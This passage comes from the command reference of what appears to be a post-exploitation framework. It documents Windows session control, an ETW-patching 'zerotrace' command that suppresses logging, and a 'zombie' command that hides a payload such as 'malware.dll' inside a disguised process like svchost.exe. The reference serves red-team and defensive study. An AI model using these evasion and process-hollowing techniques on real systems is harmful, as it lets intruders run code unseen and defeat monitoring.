  The Session ID is optional and this will return all processes if omitted.
- **disconnect** or **dis** [session]:
  (Windows Only) Disconnect the user session. This will kick off users
  if they are using Remote Desktop and will lock consoles otherwise.
  This does not kill the user session processes running and they will be
  resumed if the user logs back in.
- **logoff** [session]:
  (Windows Only) Logoff the user session. Unlike the `disconnect` action,
  this will terminate all running user processes when kicking the user out.
- **message** or **msg** [session] [-f|--flags <N>] [-w|--wait <N>] [-t|--seconds <N>] [title] [text]:
  (Windows Only) Display a message similar to the `window message` function.
  This will return once the message is displayed, but the `-w` wait
  argument may be specified to only return once the user clicks on the
  message box. If the `-w` wait argument is specified, this will only
  display the message box for the specified number of seconds and then
  dissapear. The `-f` flags argument may be used to specify the display
  options of the message box. This argument accepts hex values.
  The title and text options support using raw or Base64 data using
  Data Specification Identifiers. They do not support file paths.
  See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

### Examples:

```shell
wts ls
wts ps 1
wts ps cur
wts disconnect 2
wts logoff 1
wts message -1 "Hello There" "How are you?"
```

## zerotrace

```text
zerotrace
```

|       |         |
| ----- | ------- |
| OS    | Windows |
| OPsec | Safe    |
| Admin | No      |

Attempts to prevent any ETW/Debugging logs by NOP-ing/RET-ing the
ETW event and debugging Windows API function calls.

This is a helper function that aliases `evade patch_etw`.

## zombie

```text
zombie [-x|--detach]
       [-u|--user]     <user>
       [-d|--domain]   <domain>
       [-p|--password] <password>
       [-e|--entry]    <function>
       <data>
       <fake_args>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Windows                     |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Reads the data as binary data will run it in memory in a sacrificial
suspended process. The Zombie process binary fake target must exist but
can have any arguments.

If the `-x` or `--detach` argument is specified, the command will be ran
in "detached" mode and will return instantly and not be monitored. (This
also allows the process to live even when the client is closed).

The parent of this command can be controlled by the parent filter, which
can be updated with the filter commands. By default the parent will be
the current client process if not set.

Data passed to this command will be evaluated for Data Specification
Identifiers, but will default to a local file path.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

The `-e` or `--entry` argument can be used to specify the function started
after DLLMain (if the file is a DLL or DLL bytes).

This command is affected by any saved credentials (if no credentials are
specified manually. See below.)

The additional `-u`, `-p` and `-d` arguments may be used to change the
user the process is executed as. See the `runas` command for more info.

### Examples:

```shell
zombie /home/hackerman/gibson.bin svchost.exe -k LocalSystemNetworkRestricted -p -s
zombie /tmp/malware.dll notepad.exe this-file-does-not-exist.txt
zombie ~/malware.dll -a admin -p Password123 explorer.exe
zombie b$\x00\x090\x33 -a admin -p Password123 explorer.exe
```
